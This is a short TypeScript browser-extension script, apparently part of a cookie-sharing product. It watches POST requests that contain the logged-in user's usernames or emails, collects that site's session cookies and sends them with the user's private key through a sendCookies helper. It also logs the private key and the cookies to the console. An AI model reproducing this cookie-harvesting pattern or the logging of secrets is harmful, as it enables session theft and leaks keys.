import { EMPTY, merge } from 'rxjs';
import { debounceTime, filter, map, mergeMap, switchMap, tap } from 'rxjs/operators';

import { AuthBrowserStorageService } from '../../shared/services/auth';
import {
  listenRequestsBeforeRedirectWithBody,
  listenRequestsOnCompletedWithBody,
  requestBodyContains,
} from './helpers/requests';
import { getCookies, sendCookies } from './helpers/cookies';

const COOKIES_DEBOUNCE_MS = 500;

const authStorage = new AuthBrowserStorageService();
const chainId = 'testnet';

authStorage.getActiveUser().pipe(
  switchMap((user) => {
    return user
      ? merge(
        listenRequestsOnCompletedWithBody({}, 'POST'),
        listenRequestsBeforeRedirectWithBody({}, 'POST'),
      ).pipe(
        filter(request => {
          return requestBodyContains(request.requestBody, [...user.usernames, ...user.emails]);
        }),
        debounceTime(COOKIES_DEBOUNCE_MS),
        switchMap(request => getCookies(new URL(request.url))),
        map((cookies) => ({user, cookies})),
      )
      : EMPTY;
  }),
  tap(console.log),
  mergeMap(({user, cookies}) => {
    return sendCookies(
      chainId,
      {
        privateKey: user.privateKey,
        publicKey: user.publicKey,
        address: user.walletAddress,
      },
      cookies,
    );
  }),
).subscribe();
